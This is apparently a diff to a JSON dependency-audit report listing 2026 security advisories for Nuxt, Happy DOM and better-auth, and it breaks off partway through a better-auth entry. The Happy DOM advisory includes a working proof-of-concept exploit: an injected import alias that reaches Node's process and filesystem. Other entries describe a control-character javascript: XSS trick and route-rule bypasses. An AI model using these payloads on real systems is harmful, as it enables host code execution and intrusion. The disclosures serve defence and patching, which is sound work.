+      "overview": "## Impact\n\nWith the default `router.options.sensitive: false`, Nuxt's page router resolves routes case-insensitively, so `/Admin` renders the same page as `/admin`. On the server, however, route rules were resolved with Nitro's route-rule matcher, which matches keys case-sensitively. A request whose path differs from a rule key only in letter case therefore rendered the page with none of that rule applied.\n\nEarlier fixes ([GHSA-mm7m-92g8-7m47](https://github.com/nuxt/nuxt/security/advisories/GHSA-mm7m-92g8-7m47), [GHSA-hxvh-4h3w-prp9](https://github.com/nuxt/nuxt/security/advisories/GHSA-hxvh-4h3w-prp9)) case-folded the route rules that the Nuxt app itself reads, such as `appMiddleware`. This advisory covers the rules applied on the server:\n\n- `redirect`: a rule used to send visitors away from a page, such as `'/admin/**': { redirect: '/login' }`, was skipped, and the page and its server-fetched data were rendered instead.\n- `headers`: per-route response headers, including security headers such as `Content-Security-Policy` or `X-Frame-Options`, were not sent.\n- `proxy`: the request was not proxied.\n- `ssr: false` and `noScripts`: the page was server-rendered, or shipped scripts, despite the rule.\n- `getRouteRules(event)` (auto-imported, or from `nuxt/server`) and `matchRouteRules` from `nuxt/server` returned no rules for the case variant.\n\n```ts\nexport default defineNuxtConfig({\n  routeRules: {\n    '/admin/**': { redirect: '/login' },\n  },\n})\n```\n\nWith this configuration, `/admin/secret` redirects to `/login`, but `/Admin/secret` rendered `app/pages/admin/secret.vue`.\n\n## Mitigating factors\n\n- Applications that set `router.options.sensitive: true` in `nuxt.config` are not affected, because their pages are only served for the exact case of the route.\n- Access checks performed in server middleware, route middleware attached with `definePageMeta`, or in the page's data fetching are not affected. The issue only affects protections that rely on a server-side route rule matching the request path.\n\n## Affected versions\n\n`nuxt` `<4.6.2`, including all Nuxt 3 releases, and `@nuxt/nitro-server` `<4.6.2`.\n\n## Patches\n\nFixed in `nuxt@4.6.2`. Nuxt 3 reached end of life on 31 July 2026 and will not receive a fix.\n\nNuxt now resolves server-side route rules itself, decoding and case-folding both the rule keys and the request path unless `router.options.sensitive` is set, and applies the result to Nitro's `redirect`, `headers` and `proxy` handling, the renderer, and the `getRouteRules` / `matchRouteRules` helpers.\n\nWhen routing is case-insensitive, patched releases change some behaviour:\n\n- Route rules also apply to case variants of server API routes. For example, `/API/x` now matches a `/api/**` `proxy` or `headers` rule.\n- Rule keys that differ only in letter case now resolve to the same path on the server, and the later key takes precedence.\n\nThe following are not changed by this fix:\n\n- `cache` and `swr` response caching is attached to server routes by Nitro's router, which matches case-sensitively. A case variant is still rendered with its route rules applied, but its response is not cached.\n- Rules that a deployment preset compiles into platform configuration (for example Vercel's `config.json` or Netlify's `_redirects` and `_headers`) are matched by the platform. Once a request reaches the Nuxt server, the rules are applied as described above.\n- If `sensitive` is set only in `app/router.options.ts`, the server follows the `nuxt.config` value. In that configuration route rules can only apply to more paths, never fewer.\n\n## Workarounds\n\nUpgrade to `nuxt@4.6.2`. If you cannot upgrade, including on Nuxt 3:\n\n1. Set `router: { options: { sensitive: true } }` in `nuxt.config`, so pages are only served for the exact case of their route.\n2. Alternatively, enforce access control in server middleware or route middleware rather than relying on a `redirect` route rule, and set security headers for every response rather than per route.",
+      "reported_by": null,
+      "title": "Nuxt: Server-side route rules (`redirect`, `headers`, `proxy`, `ssr`) are skipped for case-variant paths when routing is case-insensitive",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-114132"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@nuxt/nitro-server",
+      "vulnerable_versions": ">=4.2.0 <4.6.2",
+      "github_advisory_id": "GHSA-vjh5-4x84-xrqp",
+      "recommendation": "Upgrade to version 4.6.2 or later",
+      "patched_versions": ">=4.6.2",
+      "updated": "2026-10-22T16:59:57.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-178",
+        "CWE-863"
+      ],
+      "url": "https://github.com/advisories/GHSA-vjh5-4x84-xrqp"
+    },
+    "1242830": {
+      "findings": [
+        {
+          "version": "4.5.2",
+          "paths": [
+            "apps__web>nuxt"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nuxt/nuxt/security/advisories/GHSA-vjh5-4x84-xrqp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-114132\n- https://github.com/nuxt/nuxt/commit/f6cfee52cf9576ddc4f4ee83b486969328b358f8\n- https://github.com/nuxt/nuxt/releases/tag/v4.6.2\n- https://github.com/advisories/GHSA-vjh5-4x84-xrqp",
+      "created": "2026-10-22T16:59:55.000Z",
+      "id": 1242830,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nWith the default `router.options.sensitive: false`, Nuxt's page router resolves routes case-insensitively, so `/Admin` renders the same page as `/admin`. On the server, however, route rules were resolved with Nitro's route-rule matcher, which matches keys case-sensitively. A request whose path differs from a rule key only in letter case therefore rendered the page with none of that rule applied.\n\nEarlier fixes ([GHSA-mm7m-92g8-7m47](https://github.com/nuxt/nuxt/security/advisories/GHSA-mm7m-92g8-7m47), [GHSA-hxvh-4h3w-prp9](https://github.com/nuxt/nuxt/security/advisories/GHSA-hxvh-4h3w-prp9)) case-folded the route rules that the Nuxt app itself reads, such as `appMiddleware`. This advisory covers the rules applied on the server:\n\n- `redirect`: a rule used to send visitors away from a page, such as `'/admin/**': { redirect: '/login' }`, was skipped, and the page and its server-fetched data were rendered instead.\n- `headers`: per-route response headers, including security headers such as `Content-Security-Policy` or `X-Frame-Options`, were not sent.\n- `proxy`: the request was not proxied.\n- `ssr: false` and `noScripts`: the page was server-rendered, or shipped scripts, despite the rule.\n- `getRouteRules(event)` (auto-imported, or from `nuxt/server`) and `matchRouteRules` from `nuxt/server` returned no rules for the case variant.\n\n```ts\nexport default defineNuxtConfig({\n  routeRules: {\n    '/admin/**': { redirect: '/login' },\n  },\n})\n```\n\nWith this configuration, `/admin/secret` redirects to `/login`, but `/Admin/secret` rendered `app/pages/admin/secret.vue`.\n\n## Mitigating factors\n\n- Applications that set `router.options.sensitive: true` in `nuxt.config` are not affected, because their pages are only served for the exact case of the route.\n- Access checks performed in server middleware, route middleware attached with `definePageMeta`, or in the page's data fetching are not affected. The issue only affects protections that rely on a server-side route rule matching the request path.\n\n## Affected versions\n\n`nuxt` `<4.6.2`, including all Nuxt 3 releases, and `@nuxt/nitro-server` `<4.6.2`.\n\n## Patches\n\nFixed in `nuxt@4.6.2`. Nuxt 3 reached end of life on 31 July 2026 and will not receive a fix.\n\nNuxt now resolves server-side route rules itself, decoding and case-folding both the rule keys and the request path unless `router.options.sensitive` is set, and applies the result to Nitro's `redirect`, `headers` and `proxy` handling, the renderer, and the `getRouteRules` / `matchRouteRules` helpers.\n\nWhen routing is case-insensitive, patched releases change some behaviour:\n\n- Route rules also apply to case variants of server API routes. For example, `/API/x` now matches a `/api/**` `proxy` or `headers` rule.\n- Rule keys that differ only in letter case now resolve to the same path on the server, and the later key takes precedence.\n\nThe following are not changed by this fix:\n\n- `cache` and `swr` response caching is attached to server routes by Nitro's router, which matches case-sensitively. A case variant is still rendered with its route rules applied, but its response is not cached.\n- Rules that a deployment preset compiles into platform configuration (for example Vercel's `config.json` or Netlify's `_redirects` and `_headers`) are matched by the platform. Once a request reaches the Nuxt server, the rules are applied as described above.\n- If `sensitive` is set only in `app/router.options.ts`, the server follows the `nuxt.config` value. In that configuration route rules can only apply to more paths, never fewer.\n\n## Workarounds\n\nUpgrade to `nuxt@4.6.2`. If you cannot upgrade, including on Nuxt 3:\n\n1. Set `router: { options: { sensitive: true } }` in `nuxt.config`, so pages are only served for the exact case of their route.\n2. Alternatively, enforce access control in server middleware or route middleware rather than relying on a `redirect` route rule, and set security headers for every response rather than per route.",
+      "reported_by": null,
+      "title": "Nuxt: Server-side route rules (`redirect`, `headers`, `proxy`, `ssr`) are skipped for case-variant paths when routing is case-insensitive",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-114132"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nuxt",
+      "vulnerable_versions": ">=4.0.0 <4.6.2",
+      "github_advisory_id": "GHSA-vjh5-4x84-xrqp",
+      "recommendation": "Upgrade to version 4.6.2 or later",
+      "patched_versions": ">=4.6.2",
+      "updated": "2026-10-22T16:59:57.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-178",
+        "CWE-863"
+      ],
+      "url": "https://github.com/advisories/GHSA-vjh5-4x84-xrqp"
+    },
+    "1242831": {
+      "findings": [
+        {
+          "version": "4.5.2",
+          "paths": [
+            "apps__web>nuxt"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nuxt/nuxt/security/advisories/GHSA-xfq5-w38q-pc2x\n- https://nvd.nist.gov/vuln/detail/CVE-2026-114133\n- https://github.com/nuxt/nuxt/commit/493565e99451a0f52330b1f6b979254a4a39e5d0\n- https://github.com/nuxt/nuxt/releases/tag/v4.6.2\n- https://github.com/advisories/GHSA-xfq5-w38q-pc2x",
+      "created": "2026-10-22T16:58:00.000Z",
+      "id": 1242831,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\n`useHeadSafe` restricts head input to an allowlist of safe tags and attributes. For example, `bodyAttrs` is limited to `class` and `style`, event handler attributes are removed, and `<script>` tags are only kept for JSON types.\n\nWhen `useHeadSafe` is called inside a server island (a `.server.vue` component or page, or a component rendered with `<NuxtIsland>`), the island renderer serialises the raw input of every head entry into the island response without the option that marks it as safe input. `<NuxtIsland>` then pushes that input into the page's head as a regular entry, both during server rendering and when hydrating or refetching on the client.\n\nAs a result, input that `useHeadSafe` would normally strip (such as `bodyAttrs.onload` or executable `<script>` content) is rendered into the page. If an application passes user-controlled data to `useHeadSafe` inside a server island, an attacker who controls that data can achieve stored cross-site scripting on the application's origin.\n\n```vue\n<!-- components/AuthorMeta.server.vue -->\n<script setup lang=\"ts\">\nconst { data: author } = await useFetch('/api/author')\n// author.value.head is user-authored, e.g. { bodyAttrs: { onload: '...' } }\nuseHeadSafe(author.value.head)\n</script>\n```\n\n## Mitigating factors\n\n- Server components are experimental. They are only active when the application defines a `.server.vue` component or page, or enables `experimental.componentIslands` and renders `<NuxtIsland>`.\n- Exploitation requires the application to pass attacker-controlled data to `useHeadSafe` inside a server island. `useHeadSafe` called from regular (non-island) components and pages is not affected.\n\n## Affected versions\n\n`nuxt` `>=3.13.0`, when head support for server islands was introduced. Nuxt 2 is not affected.\n\n## Patches\n\nFixed in `nuxt@4.6.2`. Nuxt 3 reached end of life on 31 July 2026 and will not receive a fix.\n\nPatched releases apply Unhead's safe input filtering to `useHeadSafe` entries on the server before they are added to the island response, so `islandResponse.head` (including what `render:island` hooks see) only contains input that `useHeadSafe` allows.\n\n## Workarounds\n\nUpgrade to `nuxt@4.6.2`. If you cannot upgrade, including on Nuxt 3:\n\n1. Call `useHeadSafe` with untrusted input from a regular component or page rather than from inside a server island.\n2. Alternatively, validate untrusted head input against your own allowlist before passing it to `useHeadSafe` inside a server island.",
+      "reported_by": null,
+      "title": "Nuxt server islands render `useHeadSafe` input without sanitisation",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-114133"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nuxt",
+      "vulnerable_versions": ">=3.13.0 <4.6.2",
+      "github_advisory_id": "GHSA-xfq5-w38q-pc2x",
+      "recommendation": "Upgrade to version 4.6.2 or later",
+      "patched_versions": ">=4.6.2",
+      "updated": "2026-10-22T16:58:02.000Z",
+      "cvss": {
+        "score": 5.4,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-xfq5-w38q-pc2x"
+    },
+    "1242832": {
+      "findings": [
+        {
+          "version": "4.5.2",
+          "paths": [
+            "apps__web>nuxt"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nuxt/nuxt/security/advisories/GHSA-jjm6-p2m9-9w4x\n- https://nvd.nist.gov/vuln/detail/CVE-2026-114130\n- https://github.com/nuxt/nuxt/pull/36459\n- https://github.com/nuxt/nuxt/commit/355ed9565127ff9b1453deb7160059ed55b3cb85\n- https://github.com/nuxt/nuxt/commit/df46569d5d3c7a7799de54c328634168fbae70bb\n- https://github.com/nuxt/nuxt/releases/tag/v4.6.0\n- https://github.com/advisories/GHSA-jjm6-p2m9-9w4x",
+      "created": "2026-10-22T16:51:37.000Z",
+      "id": 1242832,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\nAn application that renders `<NuxtLink :to=\"...\">` with a value it does not control can be made to render an anchor whose `href` executes script in the application's origin when clicked.\n\nThis is an incomplete fix for [GHSA-934w-87qh-qr26](https://github.com/nuxt/nuxt/security/advisories/GHSA-934w-87qh-qr26) (CVE-2026-53722). It only affects applications running without a `pages/` directory, where `pages` resolves to `false` and Nuxt registers its own router in place of vue-router. Applications using vue-router are not affected.\n\nPrefixing `javascript:` with an ASCII C0 control character, for example `%01`, meant the value was not recognised as having a protocol. It was classified as an internal route and so never reached the protocol check added in GHSA-934w-87qh-qr26, and the router used for `pages: false` passed it through to the rendered `href` unchanged. Browsers strip the leading control character and run the result as a script URL.\n\nBoth `<NuxtLink custom>` and the default anchor are affected, and the `href` is present in the server-rendered HTML.\n\n## Mitigating factors\n\n- The application must have `pages` disabled (no `pages/` directory, or `pages: false`).\n- The application must bind untrusted input to `:to`.\n- A victim must click the rendered link.\n\n## Affected versions\n\n`nuxt` `<4.6.0`, including all Nuxt 3 releases. Versions before `4.4.7` and `3.21.7` are also affected by GHSA-934w-87qh-qr26.\n\n## Patches\n\nFixed in `nuxt@4.6.0`. Nuxt 3 reached end of life on 31 July 2026 and will not receive a fix.\n\nAnchor `href` values are now checked for script-capable protocols wherever they are rendered, including the router used when `pages` is disabled. Protocol detection also moved to the platform `URL` parser, so a URL is classified the same way the browser will read it.\n\n## Workarounds\n\nUpgrade to `nuxt@4.6.0` or later. If you cannot upgrade, including on Nuxt 3, validate values before binding them to `:to`, for example by rejecting anything that is not a path beginning with a single `/`.",
+      "reported_by": null,
+      "title": "Nuxt: Incomplete fix for GHSA-934w-87qh-qr26: a `javascript:` URL prefixed with an ASCII control character executes from `<NuxtLink>` when `pages` is disabled",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-114130"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "nuxt",
+      "vulnerable_versions": "<4.6.0",
+      "github_advisory_id": "GHSA-jjm6-p2m9-9w4x",
+      "recommendation": "Upgrade to version 4.6.0 or later",
+      "patched_versions": ">=4.6.0",
+      "updated": "2026-10-22T16:51:39.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-jjm6-p2m9-9w4x"
+    },
+    "1243084": {
+      "findings": [
+        {
+          "version": "20.14.6",
+          "paths": [
+            "apps__web>happy-dom"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/capricorn86/happy-dom/security/advisories/GHSA-834v-8h66-3h79\n- https://github.com/capricorn86/happy-dom/pull/2537\n- https://github.com/capricorn86/happy-dom/commit/fd163520b74d9fa146be91f7b4e4f46d6cccbe13\n- https://github.com/capricorn86/happy-dom/releases/tag/v21.0.4\n- https://github.com/advisories/GHSA-834v-8h66-3h79",
+      "created": "2026-10-23T22:06:13.000Z",
+      "id": 1243084,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nThe ESM compiler in `happy-dom@20.14.5` does not validate imported local binding aliases before interpolating them into generated JavaScript.\n\nAs a result, an invalid ESM import alias can be transformed into a valid JavaScript destructuring default initializer and executed.\n\nThis appears to be an alternate injection path and incomplete remediation of GHSA-6q6h-j7hj-3r64 / CVE-2026-33943. The previous fix validates `importName` in the local `export { ... }` handler, but the named import handler still places an unvalidated `alias` directly into code context.\n\nThese issues were confirmed through the public `Window` and `<script type=\"module\">` APIs using the published `happy-dom` npm package. The PoC reaches the Node.js host `process`, obtains `node:fs`, and creates a proof directory on the host filesystem.\n\n## Confirmed affected versions\n\nThe PoC was directly tested against:\n\n- `happy-dom@17.0.0`\n- `happy-dom@20.0.0`\n- `happy-dom@20.1.0`\n- `happy-dom@20.14.5`\n\nThe same PoC does not trigger on `happy-dom@16.8.1`.\n\nThe ESM compiler was introduced by commit `7bc831df2`, first released in `v17.0.0`. The vulnerable interpolation remains present through `v20.14.5`, the latest release at the time of testing.\n\nSuggested affected range:\n\n```text\n>= 17.0.0, <= 20.14.5\n```\n\nNo patched version is currently available.\n\n## Preconditions\n\n- JavaScript evaluation is enabled with `enableJavaScriptEvaluation: true`.\n- Attacker-controlled HTML or module source is processed by Happy DOM.\n- This may affect SSR, preview, scraping, or testing services that evaluate externally supplied HTML.\n\n## Technical details\n\nIn `packages/happy-dom/src/module/ECMAScriptModuleCompiler.ts`, the named import handler splits an import specifier and extracts its alias:\n\n```ts\nconst nameParts = part.trim().split(/\\s+as\\s+/);\nconst alias = (nameParts[1] || nameParts[0]).replace(/[\"']/g, '');\nconst name = nameParts[0].replace(/[\"']/g, '');\n\nif (alias && name) {\n  properties.push({ name, alias });\n}\n```\n\nUnlike the patched `export { ... }` handler, the value of `alias` is not validated as a JavaScript identifier.\n\nIt is subsequently inserted directly into generated binding syntax:\n\n```ts\nnewCodeStart += `let {${properties\n  .map((property) =>\n    property.alias\n      ? `\"${property.name}\": ${property.alias}`\n      : property.name\n  )\n  .join(', ')}} = $happy_dom.imports.get('${url}')${match[8]}`;\n```\n\nConsider the following source:\n\n```js\nimport {\n  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337\n} from './dep.json' with { type: 'json' };\n```\n\nThis is invalid ECMAScript module syntax. Node.js rejects it at the `=` token.\n\nHappy DOM instead transforms it into the equivalent of:\n\n```js\nlet {\n  \"missing\": injected = globalThis.__HAPPY_DOM_PWNED__ = 1337\n} = $happy_dom.imports.get('https://poc.local/dep.json');\n```\n\nThis generated JavaScript is valid. Because the imported JSON object does not contain a `missing` property, the default initializer executes.\n\nThe `with { type: 'json' }` attribute is relevant because the compiler only generates its circular import resolver for ESM imports:\n\n```ts\nif (!match[7] || match[7] === 'esm') {\n  resolvableCircularImports.push({ url, properties });\n}\n```\n\nUsing a JSON module prevents the malicious alias from being emitted again in a later circular-import assignment, leaving the generated function syntactically valid.\n\nBacktick strings also survive the existing quote removal. This allows the injected initializer to reach Node.js host APIs:\n\n```js\nglobalThis.constructor.constructor(`return process`)()\n  .getBuiltinModule(`node:fs`)\n  .mkdirSync(\n    globalThis.constructor.constructor(`return process`)().cwd() +\n      `/HAPPY_DOM_RCE_PROOF`\n  )\n```\n\n## Proof of concept\n\nThe following PoC uses only the public Happy DOM API and performs a harmless filesystem action by creating a directory named `HAPPY_DOM_RCE_PROOF`.\n\n### 1. Create `package.json`\n\n```json\n{\n  \"name\": \"happy-dom-import-alias-rce-poc\",\n  \"private\": true,\n  \"type\": \"module\",\n  \"dependencies\": {\n    \"happy-dom\": \"20.14.5\"\n  }\n}\n```\n\n### 2. Create `dep.json`\n\n```json\n{}\n```\n\n### 3. Create `payload.mjs`\n\nThis file is used as a control to demonstrate that a native ECMAScript parser rejects the source:\n\n```js\nimport {\n  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337\n} from './dep.json' with { type: 'json' };\n```\n\n### 4. Create `poc.mjs`\n\n```js\nimport { Window } from 'happy-dom';\nimport { existsSync, rmSync } from 'node:fs';\nimport { resolve } from 'node:path';\n\nconst proofDirectory = resolve('HAPPY_DOM_RCE_PROOF');\nrmSync(proofDirectory, { recursive: true, force: true });\n\nconst window = new Window({\n  url: 'https://poc.local/',\n  settings: {\n    enableJavaScriptEvaluation: true,\n    suppressCodeGenerationFromStringsWarning: true,\n    fetch: {\n      virtualServers: [\n        {\n          url: 'https://poc.local/',\n          directory: process.cwd()\n        }\n      ]\n    }\n  }\n});\n\nconst script = window.document.createElement('script');\nscript.type = 'module';\n\nscript.textContent = `\n  import {\n    missing as injected = globalThis.constructor.constructor(\\`return process\\`)()\n      .getBuiltinModule(\\`node:fs\\`)\n      .mkdirSync(\n        globalThis.constructor.constructor(\\`return process\\`)().cwd() +\n        \\`/HAPPY_DOM_RCE_PROOF\\`\n      )\n  } from './dep.json' with { type: 'json' };\n`;\n\nwindow.document.body.appendChild(script);\nawait window.happyDOM.waitUntilComplete();\n\nif (!existsSync(proofDirectory)) {\n  console.error('[-] Exploit failed: proof directory was not created.');\n  console.error(\n    window.happyDOM.virtualConsolePrinter.readAsString()\n  );\n  process.exitCode = 1;\n} else {\n  console.log(`[+] Host filesystem reached: ${proofDirectory}`);\n}\n\nawait window.happyDOM.close();\n```\n\n### 5. Run the control test\n\n```console\nnpm install\nnode --check payload.mjs\n```\n\nExpected result:\n\n```text\nSyntaxError: Unexpected token '='\n```\n\nThis confirms that the source is not valid ESM.\n\n### 6. Run the Happy DOM PoC\n\n```console\nnode poc.mjs\n```\n\nExpected result:\n\n```text\n[+] Host filesystem reached: /path/to/HAPPY_DOM_RCE_PROOF\n```\n\nThe existence of `HAPPY_DOM_RCE_PROOF` confirms that the expression injected through the import alias executed and reached the host filesystem.\n\nThe PoC was also verified inside a `node:24-alpine` Docker container, where it created:\n\n```text\n/poc/HAPPY_DOM_RCE_PROOF\n```\n\n## Impact\n\nAn attacker who can supply module source to an application that evaluates JavaScript through Happy DOM can cause syntactically invalid import declarations to be transformed into executable JavaScript.\n\nThis may bypass upstream syntax validation or application assumptions that malformed import clauses will be rejected.\n\nThe demonstrated payload reaches Node.js `process` and built-in modules. It can therefore be adapted to read or modify files, access environment data, or execute operating-system commands with the privileges of the Happy DOM host process.\n\n## Relationship to CVE-2026-33943\n\nCVE-2026-33943 covers expression injection through a local export declaration:\n\n```js\nexport { attacker_expression }\n```\n\nIts fix added identifier validation to the `importName` used by the `export { ... }` handler:\n\n```ts\nif (\n  exportName &&\n  importName &&\n  VALID_VARIABLE_NAME_REGEXP.test(importName)\n) {\n  // ...\n}\n```\n\nThis report uses a different parsing and code-generation path:\n\n```js\nimport { name as malicious_alias } from './module';\n```\n\nThe unvalidated value is the local import `alias`, and the injection occurs in a generated destructuring binding rather than the export assignment patched by CVE-2026-33943.\n\nThe issue remains reproducible in versions released after the CVE-2026-33943 fix, including `20.14.5`.\n\n## Suggested fix\n\nValidate the imported local binding before placing it into code context. The existing `VALID_VARIABLE_NAME_REGEXP` can be reused:\n\n```diff\n- if (alias && name) {\n+ if (alias && name && VALID_VARIABLE_NAME_REGEXP.test(alias)) {\n```\n\nA regression test should compile and execute the malicious import declaration, then verify that the initializer was not evaluated.\n\nThis change was tested locally. The focused `ECMAScriptModuleCompiler` test suite passes with 30 tests, and ESLint reports no errors.\n\nFor additional hardening, generated property keys should use `JSON.stringify()` instead of manual quote interpolation.\n\n## Verification record\n\n- Testing date: 2026-09-17\n- Duplicate check updated: 2026-09-20\n- Platform: Windows 11\n- Node.js: `24.14.1`\n- Latest tested package: `happy-dom@20.14.5`\n- Source tag: `v20.14.5`\n- Source commit: `0d4cdbe7442af49d16b49ddf1acf7cc9684ed318`\n- First confirmed affected version: `17.0.0`\n- Confirmed unaffected version: `16.8.1`\n- Docker environment: Node 24 Alpine\n- No matching public advisory, issue, pull request, commit, or release was found during the duplicate check.",
+      "reported_by": null,
+      "title": "Happy DOM: Incomplete fix for CVE-2026-33943: unsanitized import alias leads to host code execution",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-115895"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "happy-dom",
+      "vulnerable_versions": ">=17.0.0 <=21.0.3",
+      "github_advisory_id": "GHSA-834v-8h66-3h79",
+      "recommendation": "Upgrade to version 21.0.4 or later",
+      "patched_versions": ">=21.0.4",
+      "updated": "2026-10-23T22:06:14.000Z",
+      "cvss": {
+        "score": 8.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-94"
+      ],
+      "url": "https://github.com/advisories/GHSA-834v-8h66-3h79"
+    },
+    "1243435": {
+      "findings": [
+        {
+          "version": "1.6.14",
+          "paths": [
+            "apps__api>better-auth"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/better-auth/better-auth/security/advisories/GHSA-q84f-53jg-9ppm\n- https://github.com/better-auth/better-auth/commit/f68044dcfbd9fb83763249ed9509cfacbcce47be\n- https://github.com/better-auth/better-auth/releases/tag/v1.7.0-rc.3\n- https://github.com/advisories/GHSA-q84f-53jg-9ppm",
+      "created": "2026-10-27T14:49:53.000Z",
+      "id": 1243435,
+      "npm_advisory_id": null,
+      "overview": "## Am I affected?\n\nYou may be affected if you use `better-auth` from `1.3.8-beta.3` up to, but not including, `1.7.0-rc.3`, and you enable the `deviceAuthorization()` plugin. This range includes all 1.6 releases.\n\nYou are affected only if all of these are also true:\n\n- An attacker can start a device request: `validateClient` is not configured, or the attacker can use a valid public client.\n- Before allowing approval, your approval page does not show, from server-checked data, which client is asking and the exact permissions it requests.\n- Users may approve a code or complete verification link they did not start and cannot compare with a device they have.\n- Your application accepts the session token that the device flow returns, for example through the bearer plugin.\n\nYou are not affected if you do not enable the opt-in `deviceAuthorization()` plugin.\n\n## Summary\n\nThe device authorization plugin lets a user sign in on one device by approving a short code on another. In affected versions, the approval information given to the user leaves out which client asked for access and which permissions it wants. The official approval examples therefore show only a generic request and a code, so users cannot tell their own device from an attacker's request.\n\n## Impact\n\nAn attacker who convinces a signed-in user to approve the attacker's code receives a live Better Auth session token for that user. The attacker can then read or change any data the user's account can access. The attack needs the opt-in device flow, a request the attacker creates, and a user who actively approves it; it is not a sign-in bypass without user action.\n\n## Patches\n\nThe fix first shipped in `1.7.0-rc.3`. Upgrade to `better-auth@1.7.0` or later. No 1.6 release contains the fix.\n\nAfter upgrading, `GET /device` returns the requesting `client_id` and `scope` to the signed-in account that owns the request. If you built your own approval page, update it to show that client and those permissions, and keep approval disabled until they load.\n\n## Workarounds\n\nIf you cannot upgrade yet, do the following:\n\n- Disable `deviceAuthorization()`, or block untrusted access to `/device/code`.\n- Configure a strict `validateClient` allowlist. Do not rely on the allowlist alone: it limits who can start the flow, but it does not give users the missing approval information.\n- Build your own approval endpoint. It should read the pending request from trusted server-side storage and map the checked client identifier to a trusted display name. Show the exact requested permissions and the user code. Keep approval disabled until this information loads.\n- Tell users to reject device requests they did not expect. They should approve only when the same code is visible right now on a device they have.\n\n## Technical details\n\nA device starts the flow by calling `/device/code`. The plugin stores the client identifier and any requested scope with the pending request. Before approval, `GET /device` returns only the user code and its status. This is true even for a signed-in session of the user account that owns the request. An approval page built from that response cannot show which client asked for access or which permissions it wants. After approval, the original device code can be redeemed at `/device/token` for a Better Auth session token.\n\nRFC 8628 describes this remote phishing scenario. It recommends that the server tell users they are authorizing a device and ask them to confirm that the device is in their possession. It also recommends showing device information that helps users detect impersonation. Client allowlisting reduces who can start the flow, but it does not give users the missing approval information. A valid public client can therefore still be affected when its identifier and requested permissions are not shown.",
+      "reported_by": null,
+      "title": "better-auth: Device login approval does not show the requesting client or permissions",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "better-auth",
+      "vulnerable_versions": ">=1.3.8-beta.3 <1.7.0-rc.3",
+      "github_advisory_id": "GHSA-q84f-53jg-9ppm",
+      "recommendation": "Upgrade to version 1.7.0-rc.3 or later",
+      "patched_versions": ">=1.7.0-rc.3",
+      "updated": "2026-10-27T14:49:54.000Z",
+      "cvss": {
+        "score": 8.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-451"
+      ],
+      "url": "https://github.com/advisories/GHSA-q84f-53jg-9ppm"
+    },
+    "1243466": {
+      "findings": [
+        {
+          "version": "1.6.14",
+          "paths": [
+            "apps__api>better-auth"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/better-auth/better-auth/security/advisories/GHSA-r4xp-prcw-77qf\n- https://github.com/better-auth/better-auth/pull/11494\n- https://github.com/better-auth/better-auth/commit/ac54bfd67821a7607533af2059858b12bc54e26a\n- https://github.com/better-auth/better-auth/releases/tag/v1.7.7\n- https://github.com/advisories/GHSA-r4xp-prcw-77qf",
+      "created": "2026-10-27T15:32:16.000Z",
+      "id": 1243466,
+      "npm_advisory_id": null,
+      "overview": "## Am I affected?\n\nYou may be affected if you use `better-auth` from 1.5.0-beta.12 through versions before 1.7.7 with the OAuth Proxy plugin. You are affected only if **all** of these are also true:\n\n- On a participating environment, the OAuth Proxy plugin has no dedicated `secret`, or its `secret` equals that environment's global Better Auth secret.\n- Sign-in state is stored in a cookie (`account.storeStateStrategy: \"cookie\"`). With a database or secondary storage, this is only the case if you chose it explicitly.\n- Implicit account linking is on (the default).\n\nYou are not affected by this path if every participating environment uses a proxy `secret` distinct from its global Better Auth secret, if sign-in state is stored in the database, or if you use a version before 1.5.0-beta.12.\n\n## Summary\n\nThe OAuth Proxy plugin trusts any user profile it can decrypt. In the affected setup, Better Auth encrypts sign-in state, including data the caller chose, with the same secret and hands it to anyone who starts a social sign-in. An attacker can use this to get a fake profile for another user's email address that the proxy accepts as real.\n\n## Impact\n\nAn attacker without an account who knows a user's verified email address can sign in as that user, with that user's permissions. They can read private data, change the account, and link a provider account of their choice to it. They need no provider sign-in and no action from the victim. No availability impact is established, and a reported open redirect was not confirmed.\n\n## Patches\n\nThe fix is merged for the planned `better-auth` 1.7.7 release. That package is not available yet.\n\nUpgrade all nodes handling the same cookie-backed 